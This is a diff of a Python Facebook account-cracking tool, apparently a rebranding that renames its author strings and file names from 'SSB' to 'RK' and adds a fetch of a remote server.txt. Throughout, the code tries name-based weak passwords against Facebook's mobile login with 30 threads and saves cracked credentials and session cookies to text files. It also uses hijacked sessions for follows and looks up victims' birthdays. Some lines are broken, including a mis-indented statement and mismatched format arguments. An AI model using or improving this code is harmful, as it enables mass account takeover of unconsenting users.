@@ -72,55 +72,55 @@ def jalan(z):
         time.sleep(0.01)
 
 logo =                                          """   
-▀██▀─▄███▄─▀██─██▀██▀▀█
 
-─██─███─███─██─██─██▄█
-
-─██─▀██▄██▀─▀█▄█▀─██▀█
-
-▄██▄▄█▀▀▀─────▀──▄██▄▄█
+\033[1;37m██████╗░░░░██╗░░██╗░░░░██╗░░░░░░░██╗
+\033[1;37m██╔══██╗░░░██║░██╔╝░░░░██║░░██╗░░██║
+\033[1;37m██████╔╝░░░█████═╝░░░░░╚██╗████╗██╔╝
+\033[1;37m██╔══██╗░░░██╔═██╗░░░░░░████╔═████║░
+\033[1;37m██║░░██║██╗██║░╚██╗██╗░░╚██╔╝░╚██╔╝░
+\033[1;37m╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░
 \x1b[1;97m------------------------\x1b[1;97m------------------------
 \033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Rizwan
 \033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Rizwan ullah
 \033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           /Badshawazir
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             1.0.0
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m            0.0.1
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
 	    pass
 	if len(cp) != 0:
-	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back SSB Menu ")
-	    sarfraz()
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRK_OK.txt' % (H, P, str(len(ok))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRK_CP.txt' % (H, P, str(len(cp))))
+	    input("\x1b[1;97mPress enter to back R.K.W Menu ")
+	    rizwan()
 
-def sarfraz():
+def rizwan():
     os.system('clear')
     print(logo)
     ipm = requests.get(url_ip).json()
     todz = ''
     IP = ipm['origin']
     
-
+      r= requests.get("https://raw.githubusercontent.com/JEWELFUND/XBADDO/main/server.txt").text 
     print
     print(' [1] Start File Cloning')
     print(' [2] Create File [Best-Method]')
     print(' [E] exit ')
     print('')
-    _sarfraz___ = input(' [?] Choose option : ')
-    if _sarfraz___ in ('1', '01'):
-        __xxx__().sarfrazx(id)
-    if _sarfraz___ in ('2', '02'):
+    _rizwan___ = input(' [?] Choose option : ')
+    if _rizwan___ in ('1', '01'):
+        __xxx__().rizwanx(id)
+    if _rizwan___ in ('2', '02'):
         create_file()
-    if _sarfraz___ in ('E', 'ee'):
+    if _rizwan___ in ('E', 'ee'):
         pass
 
 
 class __xxx__:
     def __init__(self):
         self.id = []
-    def sarfrazx(self,id):
+    def rizwanx(self,id):
         os.system("clear")
         print(logo)
         self.cnt = input('Put File Name : ')
@@ -133,10 +133,10 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.sarfrazx(id)
+            self.rizwanx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;97m[RK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -186,10 +186,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [SSB-OK] {user} | {pw}")
+                    print(f"\r{H} [RK-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('SSB_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('RK_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -198,10 +198,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [RK-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('RK_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -209,10 +209,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [RK-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('RK_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -240,7 +240,7 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with rizwanrkw(max_workers=30) as rkwworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -255,7 +255,7 @@ class __xxx__:
                         else:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        rkwworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -274,7 +274,7 @@ class __xxx__:
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with rizwanrkw(max_workers=30) as rkwworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -283,7 +283,7 @@ class __xxx__:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        rkwworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -353,7 +353,7 @@ def manual():
     print('  Ids saved as: '+save_file)
     print(50*'-')
     input(' Press enter to back')
-    sarfraz()
+    rizwan()
     
 def auto():
     os.system('rm -rf temp*')
@@ -464,8 +464,8 @@ def auto():
     print('  File saved as: /sdcard/'+save_file)
     print(50*'-')
     input('  Press enter to back ')
-    safraz()
+    rizwan()
     
     
     
-sarfraz()
+rizwan()
